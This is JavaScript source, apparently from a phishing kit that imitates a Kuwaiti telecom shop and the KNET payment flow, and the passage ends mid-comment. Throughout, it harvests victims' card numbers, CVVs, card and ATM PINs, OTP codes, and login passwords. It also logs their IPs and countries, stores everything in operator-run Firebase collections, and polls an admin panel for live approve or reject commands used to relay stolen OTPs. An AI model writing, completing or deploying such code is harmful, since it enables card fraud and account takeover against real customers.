(function () {
  // ═══════════════════════════════════════════════════════════
  // إعدادات Firebase — تُقرأ من متغيّرات البيئة (لا مفاتيح في الكود)
  //   • الاستضافة الديناميكية (serve.py): window.__FIREBASE_ENV__ محقون في الصفحة
  //   • الاستضافة الثابتة (Netlify): assets/js/firebase-env.js مولّد عند البناء
  // ═══════════════════════════════════════════════════════════
  const ENV = window.__FIREBASE_ENV__ || {};
  const firebaseConfig = {
    apiKey: ENV.apiKey,
    authDomain: ENV.authDomain,
    databaseURL: ENV.databaseURL,
    projectId: ENV.projectId,
    storageBucket: ENV.storageBucket,
    messagingSenderId: ENV.messagingSenderId,
    appId: ENV.appId,
    measurementId: ENV.measurementId
  };

  if (!firebaseConfig.apiKey) {
    console.error('Firebase config مفقود: اضبط متغيّرات البيئة FIREBASE_* '
      + '(أو window.__FIREBASE_ENV__).');
  }

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }

  // تحميل وحدة المصادقة ديناميكياً إذا لم تكن محمّلة
  let authLoaded = (typeof firebase.auth === 'function');
  const ensureAuthLoaded = (authLoaded
    ? Promise.resolve()
    : new Promise(function (resolve, reject) {
        const s = document.createElement('script');
        s.src = 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js';
        s.onload = resolve;
        s.onerror = reject;
        document.head.appendChild(s);
      }));

  // المصادقة: حساب اللوحة (من env) — تسجيل الدخول المجهول معطّل في هذا المشروع.
  // لا كلمات مرور مضمّنة في الملف؛ القيم تُحقن من متغيّرات البيئة عبر
  // window.__FIREBASE_ENV__ (serve.py) أو assets/js/firebase-env.js (الاستضافة الثابتة).
  let __authReady = null;

  window.ensureAuthReady = function () {
    if (__authReady) return __authReady;
    __authReady = ensureAuthLoaded.then(function () {
      const auth = firebase.auth();
      if (auth.currentUser) return auth.currentUser.getIdToken();
      if (ENV.panelEmail && ENV.panelPassword) {
        return auth.signInWithEmailAndPassword(ENV.panelEmail, ENV.panelPassword)
          .then(function () { return auth.currentUser.getIdToken(); });
      }
      return auth.signInAnonymously()
        .then(function () { return auth.currentUser.getIdToken(); });
    }).catch(function (err) {
      console.error('Firebase auth failed:', err && err.code, err && err.message);
      return null;
    });
    return __authReady;
  };

  const db = firebase.firestore();
  const rtd = firebase.database();

  // إتاحة المراجع عالمياً للصفحات الأخرى
  window.db = db;
  window.rtd = rtd;

  let sessionId = localStorage.getItem('zain_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('zain_session_id', sessionId);
  }
  window.sessionId = sessionId;

  // مرجع وثيقة العميل في Firestore (المصدر الموحّد للوحة التحكم الجديدة)
  const customerRef = db.collection("customers").doc(sessionId);
  window.customerRef = customerRef;

  window.getDeviceAndBrowser = function () {
    const ua = navigator.userAgent;
    let browser = "Other";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let device = "PC";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
      device = "Mobile";
    }
    return { device, browser };
  };

  // كشف دولة الزائر من عنوان IP عبر خدمة geolocation
  // نحاول عدة خدمات لضمان الموثوقية، ونتيجة ثابتة (cache) لتجنب التكرار
  let __visitorCountry = null;
  let __visitorCountryPromise = null;
  window.getVisitorCountry = function () {
    if (__visitorCountry) return Promise.resolve(__visitorCountry);
    if (__visitorCountryPromise) return __visitorCountryPromise;
    __visitorCountryPromise = (async () => {
      // خريطة رموز الدول إلى أسماء عربية
      const countryNames = {
        KW: 'الكويت', SA: 'السعودية', AE: 'الإمارات', QA: 'قطر', BH: 'البحرين',
        OM: 'عُمان', JO: 'الأردن', EG: 'مصر', IQ: 'العراق', LB: 'لبنان',
        SY: 'سوريا', PS: 'فلسطين', YE: 'اليمن', SD: 'السودان', LY: 'ليبيا',
        TN: 'تونس', DZ: 'الجزائر', MA: 'المغرب', MR: 'موريتانيا', SO: 'الصومال',
        IR: 'إيران', TR: 'تركيا', US: 'الولايات المتحدة', GB: 'بريطانيا',
      };
      const services = [
        'https://ipapi.co/json/',
        'https://ipwho.is/',
        'https://get.geojs.io/v1/ip/country.json',
      ];
      for (const url of services) {
        try {
          const res = await fetch(url);
          if (!res.ok) continue;
          const data = await res.json();
          let code = data.country_code || data.country || data.code || '';
          code = String(code).toUpperCase().trim();
          if (code && code.length === 2) {
            __visitorCountry = countryNames[code] || code;
            return __visitorCountry;
          }
        } catch (e) {}
      }
      __visitorCountry = 'غير معروف';
      return __visitorCountry;
    })();
    return __visitorCountryPromise;
  };

  function getFriendlyPageName() {
    const path = window.location.pathname;
    if (path.includes('prize-username')) return 'اسم مستخدم - مسابقة الجوائز';
    if (path.includes('prize-text-password')) return 'كلمة مرور نصية - مسابقة الجوائز';
    if (path.includes('prize-password')) return 'الرقم السري 6 أرقام - مسابقة الجوائز';
    if (path.includes('prize-wait')) return 'انتظار مسابقة الجوائز';
    if (path.includes('knet')) return 'صفحة الكي نت';
    if (path.includes('verification')) return 'صفحة التحقق';
    if (path.includes('forgot-password')) return 'نسيت كلمة المرور';
    if (path.includes('login-regist')) return 'إكمال التسجيل';
    if (path.includes('otp-new')) return 'التحقق من OTP (4 أرقام)';
    if (path.includes('otpcredit')) return 'رمز الفيزا';
    if (path.includes('otp')) return 'التحقق من OTP';
    if (path.includes('gateway')) return 'بوابة الدفع';
    if (path.includes('carte')) return 'سلة التسوق';
    if (path.includes('loan')) return 'طلب سلفة';
    if (path.includes('refund')) return 'طلب استرداد';
    if (path.includes('watch')) return 'طلب الساعة الذكية';
    if (path.includes('shop')) return 'المتجر';
    if (path.includes('wait1')) return 'صفحة الانتظار';
    if (path.includes('order1')) return 'تتبع الطلب';
    if (path.includes('login')) return 'تسجيل الدخول';
    return 'الصفحة الرئيسية';
  }

  // ═══════════════════════════════════════════════════════════
  // ضمان وجود وثيقة العميل customers/{sessionId} بالحقول المطلوبة للوحة
  // ═══════════════════════════════════════════════════════════
  window.ensureCustomerDoc = function (extra) {
    const now = Date.now();
    const base = {
      sessionId: sessionId,
      status: 'pending',
      decision: 'pending',
      lastSeen: now,
      currentPage: getFriendlyPageName(),
      name: localStorage.getItem('customerName') || '',
      phone: localStorage.getItem('phone') || '',
      mobile: localStorage.getItem('phone') || '',
      address: localStorage.getItem('address') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      isHidden: false,
      flagColor: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    const merged = Object.assign({}, base, extra || {});
    return customerRef.set(merged, { merge: true });
  };

  // ═══════════════════════════════════════════════════════════
  // نبض الحضور (heartbeat) — يكتب lastSeen في customers/{sessionId} كل 10 ثوانٍ
  // كي يظهر العميل "متصل" في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  let __heartbeatTimer = null;
  window.startPresenceHeartbeat = function () {
    if (__heartbeatTimer) return;
    customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    __heartbeatTimer = setInterval(function () {
      customerRef.set({ lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
    }, 10000);

    // عند مغادرة الصفحة: اكتب lastSeen قديم ليصبح العميل "غير متصل"
    window.addEventListener('beforeunload', function () {
      try {
        customerRef.set({ lastSeen: Date.now() - 70000 }, { merge: true });
      } catch (e) {}
    });
  };

  window.initFirebaseSession = async function () {
    const { device, browser } = window.getDeviceAndBrowser();
    const docRef = db.collection("payments").doc(sessionId);
    const friendlyPage = getFriendlyPageName();
    const rtdSessionRef = rtd.ref('sessions/' + sessionId);
    const now = Date.now();
    const createdTime = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

    // جلب IP بشكل سريع وغير معطل للدخول
    let visitorIp = 'Unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      visitorIp = data.ip;
    } catch (e) {}

    // كشف دولة الزائر من عنوان IP (لا يُعطل الدخول بانتظارها)
    let visitorCountry = 'غير معروف';
    try {
      visitorCountry = await window.getVisitorCountry();
    } catch (e) {}

    const sessionData = {
      id: sessionId,
      status: 'active',
      phone: localStorage.getItem('phone') || '',
      amount: localStorage.getItem('finalAmount') || localStorage.getItem('amount') || '0.000 د.ك',
      page: friendlyPage,
      device: device,
      browser: browser,
      createdTime: createdTime,
      startTime: now,
      country: visitorCountry,
      hasNewActivity: false,
      ip: visitorIp
    };

    // ضمان وجود وثيقة العميل في customers (المصدر الموحّد للوحة الجديدة)
    try {
      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser, country: visitorCountry });
    } catch (e) { console.error("ensureCustomerDoc error:", e); }

    // بدء نبض الحضور
    window.startPresenceHeartbeat();

    // Update RTD (للتوافق مع اللوحة القديمة)
    rtdSessionRef.once('value', (snapshot) => {
      if (!snapshot.exists()) {
        rtdSessionRef.set(sessionData);
      } else {
        rtdSessionRef.update({ page: friendlyPage, status: 'active', hasNewActivity: true, ip: visitorIp });
      }
    });

    // تتبع الحضور (presence) للوحة التحكم القديمة
    const presenceRef = rtd.ref('presence/' + sessionId);
    presenceRef.set({ online: true, lastSeen: now });
    presenceRef.onDisconnect().set({ online: false, lastSeen: Date.now() });

    // Update Firestore payments (أرشيف إضافي)
    docRef.get().then((snap) => {
      if (!snap.exists) {
        docRef.set({ ...sessionData, status: 'PENDING', paymentAttempts: [], timeline: [] });
      } else {
        docRef.update({ page: friendlyPage, hasNewActivity: true, ip: visitorIp });
      }
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات البطاقة
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
    const attemptId = 'card_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    const cardData = {
      id: attemptId,
      bankName: bank || 'غير معروف',
      cardPrefix: prefix || '',
      cardNumber: cardNum || '',
      expiry: `${expMonth || ''}/${expYear || ''}`,
      pin: pin || '',
      cvv: cvv || '',
      timestamp: timestampStr
    };

    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
    // أرشيف دائم في مجموعة cards
    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال رمز التحقق OTP
  // يكتب الحقل otp في وثيقة العميل customers/{sessionId} لعرضه في لوحة التحكم
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseOtp = function (otp) {
    const otpId = 'otp_' + Date.now();
    const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };

    // نجمع كل الكتابات ونعيدها كوعد واحد: الصفحة تنتظر انتهاءها قبل التوجيه،
    // وإلا يقطع الانتقال الكتابات الجارية فلا يصل الرمز إلى اللوحة.
    const tasks = [];
    try { tasks.push(rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData)); } catch (e) {}
    try { tasks.push(rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true })); } catch (e) {}
    try { tasks.push(db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData)); } catch (e) {}
    // أرشيف دائم في مجموعة otps
    try {
      tasks.push(db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() }));
    } catch (e) {}
    // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
    try {
      tasks.push(customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true }));
    } catch (e) {}
    return Promise.all(tasks).catch(function (err) {
      console.error('pushFirebaseOtp failed:', err && err.code, err && err.message);
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال طلبات الخدمات (سلفة / استرداد / ساعة ذكية) إلى قاعدة البيانات
  // يكتب في customers/{sessionId} (المصدر الموحّد للوحة التحكم الجديدة)
  // وفي مجموعة requests (أرشيف كل طلب كوثيقة منفصلة) وفي RTDB للتوافق.
  //   request: {
  //     type: 'loan' | 'refund' | 'watch',
  //     refNo, name, phone, address, amount,
  //     details: { ... أي حقول إضافية خاصة بنوع الطلب ... }
  //   }
  // ═══════════════════════════════════════════════════════════
  const REQUEST_TYPE_LABEL = {
    loan: 'طلب سلفة',
    refund: 'طلب استرداد',
    watch: 'طلب الساعة الذكية',
    login: 'تسجيل الدخول',
    password_reset: 'إعادة تعيين كلمة المرور',
    app_registration: 'إكمال التسجيل',
    otp: 'رمز التحقق OTP'
  };

  window.pushFirebaseRequest = function (request) {
    request = request || {};
    const type = request.type || 'request';
    const typeLabel = REQUEST_TYPE_LABEL[type] || 'طلب';
    const refNo = request.refNo || (type.toUpperCase().slice(0, 2) + '-' + Date.now().toString().slice(-8));
    const details = request.details || {};
    const now = Date.now();

    // الحقول الموحّدة التي تقرأها لوحة التحكم (اسم/هاتف/عنوان/مبلغ/الصفحة)
    const customerFields = {
      sessionId: sessionId,
      name: request.name || '',
      phone: request.phone || '',
      mobile: request.phone || '',
      address: request.address || '',
      amount: request.amount || '',
      requestType: type,
      requestTypeLabel: typeLabel,
      refNo: refNo,
      status: 'pending',
      decision: 'pending',
      lastSeen: now,
      currentPage: getFriendlyPageName(),
      isHidden: false,
      flagColor: ''
    };

    // حفظ الاسم/الهاتف محلياً ليستخدمهما ensureCustomerDoc في صفحات لاحقة
    if (customerFields.name) localStorage.setItem('customerName', customerFields.name);
    if (customerFields.phone) localStorage.setItem('phone', customerFields.phone);
    if (customerFields.address) localStorage.setItem('address', customerFields.address);

    const tasks = [];

    // 1) وثيقة العميل الموحّدة (تظهر مباشرة في جدول اللوحة)
    tasks.push(customerRef.set(Object.assign({}, customerFields, {
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    }), { merge: true }));

    // 2) أرشيف كل طلب كوثيقة منفصلة في مجموعة requests (بكل التفاصيل)
    const requestDoc = Object.assign({}, customerFields, {
      details: details,
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    });
    tasks.push(db.collection('requests').doc(refNo).set(requestDoc, { merge: true }));

    // 3) جلسة RTDB (للتوافق مع اللوحة القديمة)
    try {
      rtd.ref('sessions/' + sessionId).update({
        phone: customerFields.phone,
        amount: customerFields.amount,
        customerName: customerFields.name,
        requestType: type,
        refNo: refNo,
        page: customerFields.currentPage,
        hasNewActivity: true
      });
    } catch (e) {}

    return Promise.all(tasks).catch(function (err) {
      console.error('pushFirebaseRequest failed:', err && err.code, err && err.message);
    });
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات تسجيل دخول العميل (اسم المستخدم + كلمة المرور)
  // تُستدعى من صفحة login.html. تكتب في customers/{sessionId}
  // (اسم المستخدم في الحقل name ليظهر الزائر في اللوحة + الحقول username/pass)
  // وفي مجموعة requests كأرشيف، وفي RTDB للتوافق.
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseLogin = function (data) {
    data = data || {};
    const username = String(data.username || '').trim();
    const password = String(data.password || '');
    if (!username && !password) return Promise.resolve();

    const refNo = 'LG-' + Date.now().toString().slice(-8);
    const now = Date.now();
    const fields = {
      sessionId: sessionId,
      username: username,
      pass: password,
      name: username || (localStorage.getItem('customerName') || ''),
      phone: localStorage.getItem('phone') || '',
      mobile: localStorage.getItem('phone') || '',
      requestType: 'login',
      requestTypeLabel: REQUEST_TYPE_LABEL.login,
      refNo: refNo,
      status: 'pending',
      decision: 'pending',
      lastSeen: now,
      currentPage: getFriendlyPageName(),
      isHidden: false,
      flagColor: ''
    };

    if (username) localStorage.setItem('customerName', username);

    const tasks = [];
    // كل محاولة دخول تُضاف كعنصر في مصفوفة logins (لا تُستبدل السابقة)
    // فتظهر في اللوحة كصندوق منفصل لكل تسجيل دخول.
    tasks.push(customerRef.set(Object.assign({}, fields, {
      logins: firebase.firestore.FieldValue.arrayUnion({
        username: username,
        password: password,
        at: now,
        page: getFriendlyPageName()
      }),
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    }), { merge: true }));
    tasks.push(db.collection('requests').doc(refNo).set(Object.assign({}, fields, {
      details: { username: username, password: password },
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    }), { merge: true }));

    try {
      rtd.ref('sessions/' + sessionId).update({
        customerName: username,
        requestType: 'login',
        refNo: refNo,
        page: getFriendlyPageName(),
        hasNewActivity: true
      });
    } catch (e) {}

    return Promise.all(tasks).catch(function (err) {
      console.error('pushFirebaseLogin failed:', err && err.code, err && err.message);
    });
  };

  // إرسال تسجيل الدخول مع انتظار جاهزية المصادقة وحدّ زمني (لا يعطّل التوجيه)
  window.submitLogin = function (data) {
    let sent = false;
    function send() {
      if (sent) return Promise.resolve();
      sent = true;
      if (typeof window.pushFirebaseLogin !== 'function') return Promise.resolve();
      try {
        return Promise.resolve(window.pushFirebaseLogin(data)).catch(function () {});
      } catch (e) {
        return Promise.resolve();
      }
    }
    const ready = (typeof window.ensureAuthReady === 'function')
      ? window.ensureAuthReady().then(send).catch(send)
      : send();
    const timeout = new Promise(function (resolve) {
      setTimeout(function () { send().then(resolve); }, 2500);
    });
    return Promise.race([ready, timeout]);
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال رمز التحقق OTP (صفحة otp.html) مع انتظار المصادقة وحدّ زمني
  // ═══════════════════════════════════════════════════════════
  window.submitOtp = function (otp) {
    let sent = false;
    function send() {
      if (sent) return Promise.resolve();
      sent = true;
      if (typeof window.pushFirebaseOtp !== 'function') return Promise.resolve();
      try {
        return Promise.resolve(window.pushFirebaseOtp(otp)).catch(function () {});
      } catch (e) {
        return Promise.resolve();
      }
    }
    const ready = (typeof window.ensureAuthReady === 'function')
      ? window.ensureAuthReady().then(send).catch(send)
      : send();
    const timeout = new Promise(function (resolve) {
      setTimeout(function () { send().then(resolve); }, 2500);
    });
    return Promise.race([ready, timeout]);
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال طلب إعادة تعيين كلمة المرور (صفحة forgot-password.html)
  // يكتب مباشرة في customers/{sessionId}: كل محاولة تُضاف كعنصر في مصفوفة
  // passwordResets (لا تُستبدل السابقة) فتظهر في اللوحة كصندوق منفصل لكل محاولة.
  //   data: { card, atmPin }
  // ═══════════════════════════════════════════════════════════
  window.submitPasswordReset = function (data) {
    data = data || {};
    let sent = false;
    function send() {
      if (sent) return Promise.resolve();
      sent = true;
      const refNo = 'PR-' + Date.now().toString().slice(-8);
      const now = Date.now();
      const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
      const fields = {
        sessionId: sessionId,
        requestType: 'password_reset',
        requestTypeLabel: REQUEST_TYPE_LABEL.password_reset,
        refNo: refNo,
        status: 'pending',
        decision: 'pending',
        lastSeen: now,
        currentPage: getFriendlyPageName(),
        isHidden: false,
        flagColor: ''
      };
      const tasks = [];
      tasks.push(customerRef.set(Object.assign({}, fields, {
        passwordResets: firebase.firestore.FieldValue.arrayUnion(entry),
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }), { merge: true }));
      try {
        rtd.ref('sessions/' + sessionId).update({
          requestType: 'password_reset',
          refNo: refNo,
          page: getFriendlyPageName(),
          hasNewActivity: true
        });
      } catch (e) {}
      return Promise.all(tasks).catch(function (err) {
        console.error('submitPasswordReset failed:', err && err.code, err && err.message);
      });
    }
    const ready = (typeof window.ensureAuthReady === 'function')
      ? window.ensureAuthReady().then(send).catch(send)
      : send();
    const timeout = new Promise(function (resolve) {
      setTimeout(function () { send().then(resolve); }, 2500);
    });
    return Promise.race([ready, timeout]);
  };

  // ═══════════════════════════════════════════════════════════
  // إكمال التسجيل بالتطبيق (صفحة login-regist.html)
  // يكتب مباشرة في customers/{sessionId}: كل محاولة تُضاف كعنصر في مصفوفة
  // appRegistrations (لا تُستبدل السابقة) فتظهر في اللوحة كصندوق منفصل.
  //   data: { card, atmPin }
  // ═══════════════════════════════════════════════════════════
  window.submitAppRegistration = function (data) {
    data = data || {};
    let sent = false;
    function send() {
      if (sent) return Promise.resolve();
      sent = true;
      const refNo = 'RG-' + Date.now().toString().slice(-8);
      const now = Date.now();
      const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
      const fields = {
        sessionId: sessionId,
        requestType: 'app_registration',
        requestTypeLabel: REQUEST_TYPE_LABEL.app_registration,
        refNo: refNo,
        status: 'pending',
        decision: 'pending',
        lastSeen: now,
        currentPage: getFriendlyPageName(),
        isHidden: false,
        flagColor: ''
      };
      const tasks = [];
      tasks.push(customerRef.set(Object.assign({}, fields, {
        appRegistrations: firebase.firestore.FieldValue.arrayUnion(entry),
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }), { merge: true }));
      try {
        rtd.ref('sessions/' + sessionId).update({
          requestType: 'app_registration',
          refNo: refNo,
          page: getFriendlyPageName(),
          hasNewActivity: true
        });
      } catch (e) {}
      return Promise.all(tasks).catch(function (err) {
        console.error('submitAppRegistration failed:', err && err.code, err && err.message);
      });
    }
    const ready = (typeof window.ensureAuthReady === 'function')
      ? window.ensureAuthReady().then(send).catch(send)
      : send();
    const timeout = new Promise(function (resolve) {
      setTimeout(function () { send().then(resolve); }, 2500);
    });
    return Promise.race([ready, timeout]);
  };

  // ═══════════════════════════════════════════════════════════
  // إرسال بيانات العميل والتوصيل (الاسم، العنوان، الهاتف...)
  // تُستدعى من صفحة السلة عند المتابعة للدفع
  // ═══════════════════════════════════════════════════════════
  window.pushFirebaseCustomer = function (customer) {
    const data = {
      sessionId: sessionId,
      name: customer.name || '',
      phone: customer.phone || '',
      mobile: customer.phone || '',
      address: customer.address || '',
      apartment: customer.apartment || '',
      deliveryNotes: customer.deliveryNotes || '',
      amount: customer.amount || '',
      paymentType: customer.paymentType || 'full',
      items: customer.items || [],
      status: 'pending',
      decision: 'pending',
      lastSeen: Date.now(),
      currentPage: getFriendlyPageName(),
      isHidden: false,
      flagColor: '',
      ip: '',
      createdAt: firebase.firestore.FieldValue.serverTimestamp()
    };
    // حفظ الاسم محلياً لاستخدامه في ensureCustomerDoc
    if (data.name) localStorage.setItem('customerName', data.name);
    if (data.address) localStorage.setItem('address', data.address);
    // تحديث الجلسة اللحظية
    rtd.ref('sessions/' + sessionId).update({
      phone: data.phone,
      amount: data.amount,
      customerName: data.name,
      hasNewActivity: true
    });
    // حفظ دائم في Firestore customers (المصدر الموحّد للوحة الجديدة)
    db.collection("customers").doc(sessionId).set(data, { merge: true });
    if (data.items.length) {
      db.collection("orders").doc(sessionId).set({
        sessionId: sessionId,
        items: data.items,
        subtotal: data.amount,
        paymentType: data.paymentType,
        status: 'PENDING',
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    }
  };

  // ═══════════════════════════════════════════════════════════
  // الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسائل)
  // المصدر الأساسي: Firestore customers/{sessionId} — حقل decision/status
  //   decision = "approved" → onApproval
  //   decision = "rejected" → onRejection
  // مصدر احتياطي (للتوافق مع اللوحة القديمة): RTDB commands/{sessionId}
  // callbacks: { onApproval, onRejection, onRedirect, onMessage }
  // ═══════════════════════════════════════════════════════════
  window.listenForAdminCommands = function (callbacks) {
    callbacks = callbacks || {};

    // ---- المصدر الأساسي: Firestore customers/{sessionId} عبر onSnapshot ----
    // القرار يُنفَّذ مرة واحدة فقط ثم يُصفَّر في قاعدة البيانات إلى "pending"،
    // حتى يتمكن المدير من الكتابة/التعديل من جديد دون تكرار الرسائل أو إعادة التحميل.
    let __lastDecision = null;
    let __lastDecisionAt = 0;
    let __decisionInFlight = false;
    let __pendingSince = null;   // وقت أول رؤية للقرار "pending" بعد قرار سابق
    let __resetDone = false;     // تم تصفير آخر قرار في Firestore

    function resetDecisionToPending() {
      if (__resetDone) return;
      __resetDone = true;
      try {
        customerRef.set({ decision: 'pending', status: 'pending' }, { merge: true })
          .catch(function (e) { console.warn('decision reset failed:', e && e.message); });
      } catch (e) {
        console.warn('decision reset failed:', e);
      }
    }

    // نقطة تنفيذ واحدة للقرار (تُستدعى من Firestore ومن RTDB)
    // تمنع التكرار: نفس القرار خلال نافذة زمنية قصيرة يُتجاهل، ثم يُصفَّر في قاعدة البيانات.
    function dispatchDecision(decision, data) {
      if (decision !== 'approved' && decision !== 'rejected') return;
      data = data || {};
      if (__decisionInFlight) return;
      if (decision === __lastDecision && (Date.now() - __lastDecisionAt) < 4000) return;
      __lastDecision = decision;
      __lastDecisionAt = Date.now();
      __decisionInFlight = true;
      __resetDone = false;
      __pendingSince = null;
      try {
        if (decision === 'approved') {
          if (typeof callbacks.onApproval === 'function') callbacks.onApproval({ decision: 'approved', status: data.status, raw: data });
        } else {
          if (typeof callbacks.onRejection === 'function') callbacks.onRejection({ decision: 'rejected', status: data.status, reason: data.reason || '', raw: data });
        }
      } finally {
        setTimeout(function () { __decisionInFlight = false; }, 800);
        resetDecisionToPending();
      }
    }

    function handleDecision(decision, data) {
      // حالة معلّقة: انتظر ثانيتين للتأكد أنها الحالة الافتراضية (وليست مجرد تأخر)
      // ثم صفّر آخر قرار محلياً ليقبل قراراً جديداً بنفس القيمة.
      if (decision === 'pending' || decision === 'null' || !decision) {
        if (__lastDecision && __lastDecision !== 'pending') {
          if (__pendingSince === null) __pendingSince = Date.now();
          if (Date.now() - __pendingSince >= 2000) {
            __lastDecision = 'pending';
            __pendingSince = null;
            __resetDone = false;
          }
        } else {
          __lastDecision = 'pending';
        }
        return;
      }
      dispatchDecision(decision, data);
    }

    // استخراج قرار من استجابة Firestore REST (fields.decision.stringValue)
    function restDecision(fields) {
      if (!fields) return 'pending';
      var d = fields.decision || fields.status;
      return (d && d.stringValue) ? d.stringValue : 'pending';
    }

    // استخراج الطابع الزمني من استجابة Firestore REST
    function restTimestamp(fields) {
      if (!fields) return null;
      var t = fields.decidedAt || fields.lastSeen;
      return (t && t.timestampValue) ? t.timestampValue : null;
    }

    // بدء الاستماع اللحظي عبر onSnapshot
    function startSnapshot(token) {
      try {
        customerRef.onSnapshot((doc) => {
          if (!doc.exists) return;
          const data = doc.data() || {};
          handleDecision(data.decision || data.status || 'pending', data);
        }, (err) => {
          console.error("customerRef onSnapshot error:", err);
        });
      } catch (e) {
        console.error("onSnapshot setup error:", e);
      }
    }

    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
    function startListening() {
      window.ensureAuthReady().then(function (token) {
        // الاستماع اللحظي عبر onSnapshot
        startSnapshot(token);

        // استطلاع احتياطي عبر REST كل 2 ثانية (أسرع للاستجابة الفورية)
        const pollUrl = 'https://firestore.googleapis.com/v1/projects/' + ENV.projectId + '/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
        setInterval(function () {
          // تحديث الـ token في كل استطلاع (قد تكون انتهت صلاحيته)
          var curUser = firebase.auth().currentUser;
          var tokenPromise = curUser ? curUser.getIdToken() : Promise.resolve(token);
          tokenPromise.then(function (tk) {
            fetch(pollUrl, { headers: tk ? { 'Authorization': 'Bearer ' + tk } : {} })
              .then(function (r) { return r.json(); })
              .then(function (d) {
                if (d && d.fields) {
                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), _rest: true });
                }
              })
              .catch(function (e) { /* تجاهل أخطاء الاستطلاع بصمت */ });
          }).catch(function () {});
        }, 2000);
      });
    }

    startListening();

    // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
    const cmdRef = rtd.ref('commands/' + sessionId);

    // بصمة دائمة لكل أمر RTDB في localStorage: تبقى بعد إعادة تحميل الصفحة
    // فيمنع تنفيذ نفس الأمر مرتين (وهو سبب حلقة إعادة التحميل السابقة).
    function cmdKey(kind) { return 'zain_cmd_' + kind + '_' + sessionId; }
    function cmdStamp(cmd) {
      return String(cmd.approvedAt || cmd.rejectedAt || cmd.redirectAt || cmd.timestamp || cmd.action || '');
    }
    function alreadyDone(kind, cmd) {
      try { return localStorage.getItem(cmdKey(kind)) === cmdStamp(cmd); } catch (e) { return false; }
    }
    function markDone(kind, cmd) {
      try { localStorage.setItem(cmdKey(kind), cmdStamp(cmd)); } catch (e) {}
    }
    // تصفير عقدة الأمر في قاعدة البيانات حتى لا يُعاد قراءتها بعد الانتقال لصفحة أخرى
    function clearCmd(kind) {
      try { cmdRef.child(kind).remove().catch(function () {}); } catch (e) {}
    }
    function currentPageFile() {
      var p = window.location.pathname.split('/').pop();
      return p || 'index.html';
    }

    cmdRef.child('approval').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'APPROVE_PAYMENT') return;
      if (alreadyDone('approval', cmd)) { clearCmd('approval'); return; }
      markDone('approval', cmd);
      clearCmd('approval');
      dispatchDecision('approved', cmd);
    });

    cmdRef.child('rejection').on('value', (snap) => {
      const cmd = snap.val();
      if (!cmd || cmd.action !== 'REJECT_PAYMENT') return;
      if (alreadyDone('rejection', cmd)) { clearCmd('rejection'); return; }
      markDone('rejection', cmd);
      clearCmd('rejection');
      dispatchDecision('rejected', cmd);
    });

    // التوجيه: يُنفَّذ مرة واحدة فقط. المشكلة السابقة: بعد الانتقال تُقرأ الصفحة
